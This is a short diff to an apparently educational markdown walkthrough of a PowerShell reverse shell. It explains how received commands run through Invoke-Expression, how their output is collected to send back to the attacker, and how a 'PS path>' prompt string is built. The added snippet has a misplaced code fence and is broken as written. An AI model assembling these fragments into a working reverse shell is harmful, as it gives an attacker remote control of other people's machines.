@@ -66,3 +66,10 @@ $sendback = (iex $data 2>&1 | Out-String);
 - sets the variable `$setback` equal to the Invoke-Expression `iex $data` which executes the command
 - `2>&1 | Out-String` collects the output and error messages as text
 - `$sendback` saves it as variable to send back to attacker
+
+### Show Working Directory
+```powershell
+$sendback2 = $sendback + 'PS ' ```
++ (pwd).path + '> ';
+
+```
